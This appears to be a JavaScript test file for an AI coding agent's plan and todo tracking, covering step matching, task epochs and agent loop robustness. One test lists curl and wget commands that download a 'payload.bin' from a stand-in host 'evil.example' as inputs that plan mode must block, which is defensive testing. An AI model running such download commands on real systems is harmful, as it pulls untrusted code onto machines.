import assert from "node:assert/strict";
import test from "node:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Agent } from "../app/agent.js";
import { Registry } from "../app/registry.js";
import { planToolIsReadOnly } from "../app/plan-mode.js";
import {
  associatePlanStep,
  definePlanItems,
  selectNextActiveStep,
  settlePlanStep,
} from "../app/agent/plan.js";
import { todoWriteTool } from "../tools/todo.js";

const scope = { runId: "run-1", turnId: "turn-1", taskEpoch: 1 };

function runTool(items, tool, result = "Exit: 0\n1 test passed", succeeded = true) {
  const tracker = associatePlanStep(items, tool, scope);
  const settled = settlePlanStep(tracker, tool, result, succeeded, scope);
  if (settled?.step.status === "completed") {
    const next = selectNextActiveStep(items);
    if (next) {
      next.status = "active";
      next.startedAt ||= Date.now();
    }
  }
  return { tracker, settled };
}

test("unclassified steps accept inspection, mutation, and verification evidence", () => {
  const items = definePlanItems([
    { content: "Review the existing setup", status: "pending" },
    { content: "Final review of changes", status: "pending" },
    { content: "Polish the release notes", status: "pending" },
  ], [], scope, "plan-unclassified");

  let { settled } = runTool(items, { id: "read-1", name: "read", args: { path: "app" } }, "source", true);
  assert.equal(settled.step.status, "completed");

  const { tracker, settled: editSettled } = runTool(
    items,
    { id: "edit-1", name: "edit", args: { path: "app.js" } },
    "Updated app.js",
    true,
  );
  assert.ok(tracker, "unclassified active step must accept mutation evidence");
  assert.equal(editSettled.step.status, "completed");

  const { settled: bashSettled } = runTool(
    items,
    { id: "bash-1", name: "bash", args: { command: "npm test" } },
    "Exit: 0\n5 passed",
    true,
  );
  assert.ok(bashSettled, "unclassified step must accept verification evidence");
  assert.deepEqual(items.map(item => item.status), ["completed", "completed", "completed"]);
});

test("minor description changes preserve progress instead of duplicating items", () => {
  let items = definePlanItems([
    { content: "Explore the architecture", status: "pending" },
    { content: "Implement the fix", status: "pending" },
    { content: "Run tests", status: "pending" },
  ], [], scope, "plan-normalize");
  runTool(items, { id: "read-1", name: "read", args: { path: "app" } }, "source", true);

  const rewritten = definePlanItems([
    { content: "Explore the architecture.", status: "pending" },
    { content: "Implement the fix", status: "pending" },
    { content: "Run tests", status: "pending" },
  ], items, scope, "plan-normalize");
  assert.equal(rewritten.length, 3, "trailing punctuation must not duplicate the step");
  assert.equal(rewritten[0].id, items[0].id, "step identity must be preserved");
  assert.equal(rewritten[0].status, "completed", "completed progress must survive wording changes");
  assert.equal(rewritten.filter(item => item.status === "completed").length, 1);
});

test("duplicate descriptions receive distinct step ids", () => {
  const items = definePlanItems([
    { content: "Update the README", status: "pending" },
    { content: "Update the README", status: "pending" },
  ], [], scope, "plan-dupes");
  assert.equal(items.length, 2);
  assert.equal(new Set(items.map(item => item.id)).size, 2);
});

test("a new unrelated todo list does not carry over stale completed items", () => {
  const items = definePlanItems([
    { content: "Explore the architecture", status: "pending" },
    { content: "Implement the fix", status: "pending" },
  ], [], scope, "plan-cross-task");
  runTool(items, { id: "read-1", name: "read", args: { path: "app" } }, "source", true);

  const nextScope = { runId: "run-1", turnId: "turn-2", taskEpoch: 2 };
  const rewritten = definePlanItems([
    { content: "Run the migration script", status: "pending" },
  ], items, nextScope, "plan-cross-task");
  assert.deepEqual(rewritten.map(item => item.description), ["Run the migration script"]);
  assert.equal(rewritten.length, 1);
  assert.equal(rewritten[0].status, "active");
});

test("within-turn rewrites retain completed steps dropped from the list", () => {
  const items = definePlanItems([
    { content: "Explore the architecture", status: "pending" },
    { content: "Implement the fix", status: "pending" },
  ], [], scope, "plan-retain");
  runTool(items, { id: "read-1", name: "read", args: { path: "app" } }, "source", true);

  const rewritten = definePlanItems([
    { content: "Implement the fix", status: "pending" },
  ], items, scope, "plan-retain");
  assert.deepEqual(rewritten.map(item => [item.description, item.status]), [
    ["Explore the architecture", "completed"],
    ["Implement the fix", "active"],
  ]);
});

test("todowrite defaults missing and unknown statuses to pending", async () => {
  const result = await todoWriteTool.execute({
    todos: [
      { content: "Explore the codebase" },
      { content: "Run tests", status: "done" },
      { content: "Final review", status: "blocked" },
      { content: "Second pass", status: "in-progress" },
    ],
  });
  assert.deepEqual(result.metadata.todos.map(item => item.status), [
    "pending", "completed", "pending", "in_progress",
  ]);
  await assert.rejects(
    todoWriteTool.execute({ todos: [{ status: "pending" }] }),
    /requires content/,
  );
});

test("an empty plan does not crash step association", () => {
  const result = associatePlanStep(
    [],
    { id: "read-1", name: "read", args: { path: "x" } },
    scope,
  );
  assert.equal(result, null, "empty plan must yield no association instead of throwing");
});

test("plan mode blocks long-form curl and wget output flags", () => {
  const blocked = [
    "curl --output payload.bin https://evil.example/x",
    "curl --output=payload.bin https://evil.example/x",
    "curl --output-document payload.bin https://evil.example/x",
    "wget --output-document=payload.bin https://evil.example/x",
    "wget --output-file log.txt https://evil.example/x",
    "curl -ofile https://evil.example/x",
    "curl -O https://evil.example/x",
    "wget -O payload.bin https://evil.example/x",
  ];
  for (const command of blocked) {
    assert.equal(
      planToolIsReadOnly({ name: "bash", args: { command } }),
      false,
      `must block: ${command}`,
    );
  }
  const allowed = [
    "curl -s https://api.example.com/status",
    "wget -q -O- https://api.example.com/status",
    "git status",
    "ls -la",
  ];
  for (const command of allowed) {
    assert.equal(
      planToolIsReadOnly({ name: "bash", args: { command } }),
      true,
      `must allow: ${command}`,
    );
  }
});

test("clearing todos then calling a tool does not crash the run", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "khazai-empty-plan-"));
  const registry = new Registry();
  registry.register(todoWriteTool);
  registry.register({
    name: "read",
    description: "Read a file.",
    parameters: {
      type: "object",
      properties: { path: { type: "string" } },
      required: ["path"],
      additionalProperties: false,
    },
    async execute() { return "source"; },
  });
  const responses = [
    JSON.stringify({ tool: "todowrite", args: { todos: [] }, id: "todo-empty" }),
    JSON.stringify({ tool: "read", args: { path: "app.js" }, id: "read-1" }),
    "Done.",
  ];
  const agent = new Agent(registry, {
    workspace,
    chat: async (_messages, options) => {
      const response = responses.shift();
      options.onToken?.(response);
      return response;
    },
  });
  const events = [];
  for await (const event of agent.loop("update the plan")) events.push(event);
  const cleared = events.find(event => event.type === "plan");
  assert.equal(cleared?.items?.length ?? 0, 0, "clearing todos must produce an empty plan");
  const readResult = events.find(event => event.type === "tool-result" && event.tool === "read");
  assert.equal(readResult?.failed, false, "read must still succeed after clearing the plan");
});

test("plan exploration batch survives a failing parallel worker", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "khazai-batch-error-"));
  const registry = new Registry();
  registry.register({
    name: "read",
    description: "Read a file.",
    parameters: {
      type: "object",
      properties: { path: { type: "string" } },
      required: ["path"],
      additionalProperties: false,
    },
    async execute() { throw new Error("boom"); },
  });
  registry.register({
    name: "grep",
    description: "Search.",
    parameters: {
      type: "object",
      properties: { pattern: { type: "string" } },
      required: ["pattern"],
      additionalProperties: false,
    },
    async execute() { return "matches: none"; },
  });
  const responses = [
    JSON.stringify([
      { tool: "read", args: { path: "a.js" }, id: "read-1" },
      { tool: "grep", args: { pattern: "init" }, id: "grep-1" },
    ]),
    "Plan ready.",
  ];
  const agent = new Agent(registry, {
    workspace,
    agent: "plan",
    intentResolver: async () => ({
      intent: "answer",
      category: "ANSWER",
      operation: "answer",
      requiredEvidence: [],
      requiresPlan: false,
    }),
    chat: async (_messages, options) => {
      const response = responses.shift();
      options.onToken?.(response);
      return response;
    },
  });
  const events = [];
  for await (const event of agent.loop("explore the project")) events.push(event);
  const readResult = events.find(event => event.type === "tool-result" && event.tool === "read");
  assert.equal(readResult?.failed, true, "failing worker must surface as a failed tool result");
  assert.match(readResult?.result || "", /boom/);
  const grepResult = events.find(event => event.type === "tool-result" && event.tool === "grep");
  assert.equal(grepResult?.failed, false, "sibling worker must still complete");
  assert.equal(events.some(event => event.type === "stream-end"), true, "run must terminate normally");
});

test("clearing todos mid-plan removes every item instead of retaining completed ones", () => {
  let plan = definePlanItems([
    { content: "Explore the codebase", status: "pending" },
    { content: "Implement the fix", status: "pending" },
  ], [], scope, "plan-clear");
  const tracker = associatePlanStep(plan, { id: "read-1", name: "read", args: {} }, scope);
  settlePlanStep(tracker, { id: "read-1", name: "read", args: {} }, "src", true, scope);
  const next = selectNextActiveStep(plan);
  if (next) next.status = "active";
  assert.ok(plan.some(item => item.status === "completed"));

  const cleared = definePlanItems([], plan, scope, "plan-clear");
  assert.deepEqual(cleared, [], "an explicit clear must drop completed, active, and pending items");
});

test("matching existing steps never crosses task epochs", () => {
  const firstScope = { runId: "r1", turnId: "t1", taskEpoch: 1 };
  const secondScope = { runId: "r2", turnId: "t2", taskEpoch: 2 };
  let plan = definePlanItems([
    { content: "Explore the codebase", status: "pending" },
    { content: "Run tests", status: "pending" },
  ], [], firstScope, "plan-epoch");
  const tracker = associatePlanStep(plan, { id: "r1", name: "read", args: {} }, firstScope);
  settlePlanStep(tracker, { id: "r1", name: "read", args: {} }, "src", true, firstScope);
  const next = selectNextActiveStep(plan);
  if (next) next.status = "active";

  const nextTask = definePlanItems([
    { content: "Explore the codebase", status: "pending" },
    { content: "Run tests", status: "pending" },
  ], plan, secondScope, "plan-epoch");
  assert.equal(nextTask.length, 2, "a new task must start from its own steps");
  assert.ok(nextTask.every(item => item.status !== "completed"), "no step may inherit another task's completion");
  assert.ok(nextTask.every(item => item.evidenceIds.length === 0), "no step may inherit another task's evidence");
  assert.ok(nextTask.every(item => item.id !== plan.find(previous => previous.description === item.description)?.id), "step ids must not be reused across tasks");
});
